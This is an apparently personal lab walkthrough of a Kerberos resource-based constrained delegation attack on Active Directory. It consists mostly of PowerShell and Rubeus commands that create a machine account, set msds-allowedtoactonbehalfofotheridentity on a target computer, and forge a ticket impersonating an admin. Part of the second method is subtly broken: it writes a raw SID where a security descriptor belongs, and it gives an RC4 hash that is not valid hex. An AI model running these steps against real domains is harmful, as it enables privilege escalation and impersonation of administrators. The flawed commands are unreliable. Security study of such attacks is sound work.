Cause why do things the easy way.

---
This attack allows a user account with genericall over a machine account, to get the ticket of the machine account (or domain admin in this case).
# What does bloodhound say?
Bloodhound has a step by step process to get access to the machine.
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Rubeus.exe hash /password:Summer2018!
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```
Only issue is that `Get-DomainComputer` and `Set-DomainObject` are from powerview.

# The other way
## Create the machine account
This can be done by using powermad.ps1
Load powershell with `-executionpolicy bypass` and then load the script. 
```powershell
. .\powermad.ps1
```

With this loaded we can nwo use the `New-MahcineAccount` module.
```powershell
New-MachineAccount -MachineAccount Midgard -Password $(ConvertTo-SecureString 'earthwithacoolername' -AsPlainText -Force)
```
## Get the sid?
I spent way to long trying to find out how to find the sid without using powerview and eventually stumbled across ADSI adapter in powershell. This lets us query the directory for objects.
```powershell
$s = New-Object DirectoryServices.DirectorySearcher
$s.Filter = '(&(objectCategory=computer))'
$s.findall()
```
This gives back the ldap path of the computer which can then be used to get the sidname.
```powershell
$obj = [adsi]"LDAP://CN=Midgard,CN=Computers,DC=ninerealms,DC=local"
$obj.objectsid
```
And its not the normal sid format :( at the time I thought it had to be in the regular format so I converted it.
## Converting the sid for no logical reason.
It was a long day. **OK**
```powershell
$stringSID = (New-Object System.Security.Principal.SecurityIdentifier($obj.objectsid.value,0)).Value
```

## Add the attribute to the machine
From before we already have the binary version of the sid `$obj.objectsid.value`.

Issue is we need to get the target computer, this can be done the exact same way that the machine account was found.
```powershell
$s.findall()
$vicmac = [adsi]"LDAP://CN=MUSPELHEIM,CN=Computers,DC=ninerealms,DC=local"
```

Added the object with put.
```powershell
$vicmac.put("msds-allowedtoactonbehalfofotheridentity",$obj.objectsid.value)
```

## Run Rubeus
```powershell
Rubeus.exe hash /password:earthwithacoolername
Rubeus.exe s4u /user:Midgard$ /rc4:5ESE873D7D2510EB2DE975B7F30DD /impersonateuser:odin /msdsspn:cifs/MUSPELHEIM.ninerealms.local /ptt
```
Now you have the ticket. :)